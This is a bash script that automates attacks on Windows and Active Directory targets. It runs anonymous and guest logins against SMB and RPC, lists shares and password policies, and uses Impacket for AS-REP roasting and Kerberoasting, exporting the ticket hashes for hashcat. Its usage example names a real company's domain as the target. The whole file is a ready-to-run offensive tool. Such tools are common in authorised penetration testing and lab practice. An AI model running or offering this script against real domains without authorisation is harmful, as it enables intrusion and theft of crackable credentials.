#take some inputs
if [ $# -lt 3 ]
        then
                echo "Usage: $0 <IP> <Domin_Name> <Valide_users>"
                echo "eg: $0 10.10.10.10 tesla.com"
                exit
        else
                IP="$1"
                Domain_Name="$2"
                Valide_users="$3"
fi
#dsome colors
RED="\e[31m"
BLUE="\e[34m"
ENDCOLOR="\e[0m"
echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~NetBios~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
echo "${BLUE} nbtscan $IP ${ENDCOLOR}"
nbtscan $IP
echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~SMB Stuff~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
echo "${BLUE} smbmap -H $IP ${ENDCOLOR}"
smbmap -H $IP
echo "${BLUE} smbmap -H $IP -u null -p null ${ENDCOLOR}"
smbmap -H $IP -u null -p null
echo "${BLUE} smbmap -H $IP -u guest -p guest ${ENDCOLOR}"
smbmap -H $IP -u guest -p guest
echo "${BLUE} smbmap -H $IP -u guest -p '' ${ENDCOLOR}"
smbmap -H $IP -u guest -p ''
echo "${BLUE} smbclient -N -L //$IP ${ENDCOLOR}"
smbclient -N -L //$IP
echo "${BLUE} smbclient -U 'Guest' -L //$IP${ENDCOLOR}"
smbclient -U 'Guest' -L //$IP
echo "${BLUE} smbclient -N //$IP/ --option="client min protocol"=LANMAN1 ${ENDCOLOR}"
smbclient -N //$IP/ --option="client min protocol"=LANMAN1
echo "${BLUE} crackmapexec smb $IP ${ENDCOLOR}"
crackmapexec smb $IP
echo "${BLUE} crackmapexec smb $IP --pass-pol -u "" -p "" ${ENDCOLOR}"
crackmapexec smb $IP --pass-pol -u "" -p ""
echo "${BLUE} crackmapexec smb $IP --shares -u "" -p "" ${ENDCOLOR}"
crackmapexec smb $IP --shares -u "" -p ""
echo "${BLUE} crackmapexec smb $IP -u "guest" --shares ${ENDCOLOR}"
crackmapexec smb $IP -u "guest" --shares
echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~RPC Stuff~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
echo "${BLUE} rpcclient $IP ${ENDCOLOR}"
rpcclient $IP
echo "${BLUE} rpcclient -U "" $IP ${ENDCOLOR}"
rpcclient -U "" $IP
echo "${BLUE} rpcclient -U "Guest" $IP ${ENDCOLOR}"
rpcclient -U "Guest" $IP
echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Impacket~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
echo "${BLUE} GetADUsers.py -dc-ip $IP $Domain_Name/ -all ${ENDCOLOR}"
GetADUsers.py -dc-ip $IP "$Domain_Name/" -all
echo "${BLUE} GetNPUsers.py -dc-ip $IP -request "$Domain_Name/" -usersfile $Valide_users -format hashcat ${ENDCOLOR}"
GetNPUsers.py -dc-ip $IP -request "$Domain_Name/" -usersfile $Valide_users -format hashcat
echo "${BLUE} GetUserSPNs.py -dc-ip $IP -request "$Domain_Name/" ${ENDCOLOR}"
GetUserSPNs.py -dc-ip $IP -request "$Domain_Name/"
echo "${BLUE} getArch.py -target $IP ${ENDCOLOR}"
getArch.py -target $IP
